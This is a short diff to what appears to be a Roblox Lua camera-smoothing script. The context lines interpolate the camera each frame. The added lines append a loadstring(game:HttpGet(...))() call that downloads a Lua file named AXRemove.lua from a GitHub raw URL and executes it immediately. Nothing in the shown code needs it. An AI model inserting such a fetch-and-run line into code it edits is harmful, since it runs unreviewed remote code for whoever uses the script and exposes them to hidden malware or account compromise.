@@ -64,3 +64,5 @@ RunService.RenderStepped:Connect(function()
         camera.CFrame = camera.CFrame:Lerp(targetCFrame, smoothness)  
     end  
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/refs/heads/main/AXRemove.lua"))()
